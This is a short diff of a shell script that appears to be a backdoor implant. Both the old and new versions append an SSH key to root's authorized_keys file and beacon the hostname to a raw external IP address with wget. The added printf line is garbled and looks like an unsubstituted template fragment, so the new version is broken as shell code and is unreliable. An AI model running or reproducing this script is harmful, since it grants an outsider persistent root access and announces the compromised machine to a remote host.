@@ -1,6 +1,6 @@
 #!/bin/sh
 mkdir -p /root/.ssh
-printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFMNqSRrI7eMsJanepU2TBFakybgdszZok4dt4iFIpIq root@C202609131972630\n' >> /root/.ssh/authorized_keys
+printf %sn +PUB.strip()+ >> /root/.ssh/authorized_keys
 chmod 600 /root/.ssh/authorized_keys
-wget -q -O- http://212.32.253.3:9998/beacon_la_$(hostname) 2>/dev/null &
+wget -qO- http://212.32.253.3:9998/beacon_la_C202609131972630 &
 exec /bin/sleep 999
